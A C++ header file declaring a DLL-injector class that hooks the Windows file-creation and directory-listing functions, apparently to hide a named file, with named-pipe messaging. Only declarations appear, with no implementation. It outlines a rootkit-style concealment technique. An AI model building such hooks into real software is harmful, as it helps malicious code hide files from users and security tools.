#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include "Windows.h"
#include <string>
#include <iostream>
#include <vector>

extern "C" void context();

HANDLE WINAPI myCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
							DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
HANDLE WINAPI myFindFirstFileA(LPCSTR filename, WIN32_FIND_DATAA data);
HANDLE WINAPI myFindNextFileA(HANDLE file_desc, WIN32_FIND_DATAA data);
void init();
using namespace std;

class dll_injector
{
private:
	vector<char*> old_calls;
	//vector<string> hooked_funcs;
	string hiden_file;
	//char error_code;
	
public:
	vector<string> hooked_funcs;
	HANDLE pipe;
	HANDLE getter_pipe();
	int init_pipe(string pipe_name);
	void deinit_pipe();
	void send_message(string data);
	string get_message();


	void* hooked_logging_func;
	void* hooked_CreateFile;
	void* hooked_FindFirstFile;
	void* hooked_FindNextFile;

	void set_hidden_file_name(string name);
	string get_file_name();

	FARPROC set_up_hook(string function_name, void* new_func, char buffer[30]);
	void uninstall_all_hooks();
	void uninstall_hook(string function_name, char buffer[30]);
	//void* get_addr_func();

	dll_injector();
	//void inserting();
};

